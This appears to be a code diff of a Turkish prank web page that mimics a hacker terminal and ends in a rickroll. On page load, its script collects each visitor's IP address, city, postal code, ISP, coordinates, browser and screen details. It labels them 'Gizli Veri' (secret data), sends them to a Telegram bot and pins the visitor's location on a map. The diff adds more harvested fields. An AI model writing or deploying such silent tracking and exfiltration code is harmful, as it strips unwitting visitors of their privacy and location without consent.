@@ -2,6 +2,7 @@
 <html lang="tr">
 <head>
   <meta charset="UTF-8" />
+  <title></title>
   <style>
     html, body {
       margin: 0; padding: 0; width: 100%; height: 100%;
@@ -13,8 +14,7 @@
       justify-content: center;
       align-items: center;
     }
-    #terminal {
-      position: relative;
+    #container {
       width: 90vw;
       max-width: 800px;
       height: 80vh;
@@ -27,31 +27,71 @@
       white-space: pre-wrap;
       user-select: none;
       z-index: 10;
+      display: flex;
+      flex-direction: column;
     }
-    #rickroll {
-      position: fixed;
-      top: 0; left: 0;
-      width: 100vw;
-      height: 100vh;
+    #terminal {
+      flex: 1 1 auto;
+      overflow-y: auto;
+    }
+    #map {
+      flex: 0 0 250px;
+      margin-top: 10px;
+      border: 2px solid #00ff00;
+      border-radius: 6px;
+    }
+    #rickrollButton {
+      margin-top: 15px;
+      background: #00ff00;
+      color: black;
+      padding: 10px 20px;
       border: none;
-      pointer-events: none;
-      opacity: 0.1;
-      z-index: 1;
+      border-radius: 6px;
+      font-weight: bold;
+      cursor: pointer;
+      user-select: none;
+      transition: background 0.3s ease;
+      align-self: flex-start;
+    }
+    #rickrollButton:hover {
+      background: #00cc00;
     }
   </style>
+
+  <!-- Leaflet CSS -->
+  <link
+    rel="stylesheet"
+    href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css"
+    integrity="sha256-sA+U2Yp6gZtwTbGGV2urNfmnm6Rd2f2qJzG5/1oGPPM="
+    crossorigin=""
+  />
 </head>
 <body>
+  <div id="container">
+    <pre id="terminal"></pre>
+    <div id="map"></div>
+    <button id="rickrollButton" style="display:none;">Sürpriz İçin Tıkla</button>
+  </div>
 
-  <iframe id="rickroll" src="https://www.youtube.com/embed/dQw4w9WgXcQ?autoplay=1&mute=1&loop=1&playlist=dQw4w9WgXcQ" allow="autoplay" frameborder="0" allowfullscreen></iframe>
-
-  <div id="terminal">Terminal başlatılıyor...</div>
+  <!-- Leaflet JS -->
+  <script
+    src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"
+    integrity="sha256-o0FPCeSZkXbZ0L/oc1jyC4ikQtc6Os+uH6VJ23JM9v0="
+    crossorigin=""
+  ></script>
 
   <script>
     const terminal = document.getElementById('terminal');
+    const button = document.getElementById('rickrollButton');
+    const mapDiv = document.getElementById('map');
 
     function logToTerminal(text) {
       terminal.textContent += text + '\n';
       terminal.scrollTop = terminal.scrollHeight;
+    }
+
+    function getCurrentTime() {
+      return new Date().toLocaleString();
     }
 
     async function sendToTelegram(message) {
@@ -74,7 +114,8 @@
     }
 
     async function collectData() {
-      logToTerminal('Veriler toplanıyor...');
+      logToTerminal(`[${getCurrentTime()}] Veriler toplanıyor...`);
+
       try {
         const res = await fetch('https://ipapi.co/json/');
         const data = await res.json();
@@ -82,21 +123,59 @@
         const message = `Gizli Veri:\n` +
           `IP: ${data.ip}\n` +
           `Şehir: ${data.city}\n` +
+          `Bölge: ${data.region}\n` +
+          `Posta Kodu: ${data.postal}\n` +
           `Ülke: ${data.country_name}\n` +
-          `Tarayıcı: ${navigator.userAgent}\n` +
-          `Çözünürlük: ${screen.width}x${screen.height}\n` +
+          `ISP: ${data.org}\n` +
+          `Latitude: ${data.latitude}\n` +
+          `Longitude: ${data.longitude}\n\n` +
+
+          `Tarayıcı Bilgileri:\n` +
+          `User Agent: ${navigator.userAgent}\n` +
           `Dil: ${navigator.language}\n` +
           `Platform: ${navigator.platform}\n` +
+          `Çerez Durumu: ${navigator.cookieEnabled ? 'Aktif' : 'Kapalı'}\n` +
+          `Bağlantı Türü: ${navigator.connection ? navigator.connection.effectiveType : 'Bilinmiyor'}\n\n` +
+
+          `Ekran Bilgileri:\n` +
+          `Çözünürlük: ${screen.width}x${screen.height}\n` +
+          `Renk Derinliği: ${screen.colorDepth}\n` +
           `Zaman Dilimi: UTC${-new Date().getTimezoneOffset() / 60}\n` +
-          `Çerez: ${navigator.cookieEnabled ? 'Aktif' : 'Kapalı'}\n` +
-          `Bağlantı: ${navigator.connection ? navigator.connection.effectiveType : 'Bilinmiyor'}`;
+          `Şu anki Saat: ${getCurrentTime()}`;
 
         logToTerminal(message);
+
         await sendToTelegram(message);
-        logToTerminal('Veriler gönderildi.');
+
+        // Haritayı göster
+        showMap(data.latitude, data.longitude);
+
       } catch(e) {
-        logToTerminal('Veri toplanırken hata oluştu.');
+        logToTerminal(`[${getCurrentTime()}] Veri toplanırken hata oluştu.`);
       }
+
+      addButton();
+    }
+
+    function showMap(lat, lon) {
+      // Leaflet haritası oluştur
+      const map = L.map('map').setView([lat, lon], 13);
+
+      L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png', {
+        attribution: '&copy; OpenStreetMap contributors',
+        maxZoom: 18,
+      }).addTo(map);
+
+      L.marker([lat, lon]).addTo(map)
+        .bindPopup(`Konumunuz: [${lat.toFixed(4)}, ${lon.toFixed(4)}]`)
+        .openPopup();
+    }
+
+    function addButton() {
+      button.style.display = 'inline-block';
+      button.onclick = () => {
+        window.location.href = 'https://www.youtube.com/watch?v=dQw4w9WgXcQ';
+      };
     }
 
     collectData();
